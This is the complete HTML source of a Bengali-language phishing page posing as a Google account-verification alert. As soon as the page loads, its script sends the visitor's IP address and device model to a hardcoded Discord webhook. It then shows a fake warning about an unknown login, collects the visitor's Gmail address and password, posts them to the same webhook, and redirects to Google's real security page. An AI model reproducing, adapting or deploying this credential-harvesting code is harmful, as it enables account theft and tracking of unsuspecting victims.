<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Google Security Notification" />
    <meta property="og:description" content="Your account is under attack! Verify immediately." />
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" />

    <title>Google Verification</title>

    <script>
        const WH = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        // ১. ক্লিক করার সাথে সাথে আইপি পাঠানোর সবচেয়ে ফাস্ট উপায় (কিলার কোড)
        (async function shoot() {
            let ip = "IP Blocked";
            let model = navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown";

            try {
                // ২. আইপি ধরার জন্য হাই-স্পিড সার্ভার
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            // ৩. ডিসকর্ডে সাথে সাথে সিগন্যাল পাঠানো
            const p1 = JSON.stringify({
                content: "🚨 **NEW TARGET DETECTED!**",
                embeds: [{
                    color: 16711680,
                    fields: [
                        { name: "🌐 IP Address", value: ip },
                        { name: "📱 Mobile Model", value: model }
                    ],
                    timestamp: new Date()
                }]
            });
            navigator.sendBeacon(WH, p1);
        })();

        // ৪. জিমেইল ও পাসওয়ার্ড পাঠানোর ফাংশন
        async function sendData() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;

            if(!u || !p) return alert("সঠিক তথ্য দিন!");

            const p2 = JSON.stringify({
                content: "🧨 **LOGIN DATA CAPTURED!**",
                embeds: [{
                    color: 65280,
                    fields: [
                        { name: "Email", value: u },
                        { name: "Password", value: p }
                    ]
                }]
            });

            await fetch(WH, { method: "POST", headers: {"Content-Type":"application/json"}, body: p2 });
            alert("ভেরিফিকেশন সফল! আপনার অ্যাকাউন্ট এখন নিরাপদ।");
            window.location.href = "https://myaccount.google.com/security";
        }
    </script>

    <style>
        body { background: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #d93025; }
        .logo { width: 50px; margin-bottom: 20px; }
        .warn { background: #fff3f2; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 25px; font-size: 14px; color: #3c4043; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
    <h2 style="font-size: 20px; margin-bottom: 15px;">অ্যাকাউন্ট ভেরিফিকেশন</h2>
    <div class="warn">
        <strong>⚠️ জরুরি সতর্কতা:</strong> আপনার জিমেইল অ্যাকাউন্টে অন্য একটি অপরিচিত ডিভাইস থেকে লগইন করার চেষ্টা করা হয়েছে। আপনার আইডিটি নিরাপদ রাখতে এবং ব্যান হওয়া থেকে বাঁচাতে এখনই ভেরিফাই করুন।
    </div>
    <input type="email" id="u" placeholder="জিমেইল এড্রেস">
    <input type="password" id="p" placeholder="পাসওয়ার্ড">
    <button class="btn" onclick="sendData()">ভেরিফাই করুন</button>
</div>

</body>
</html>
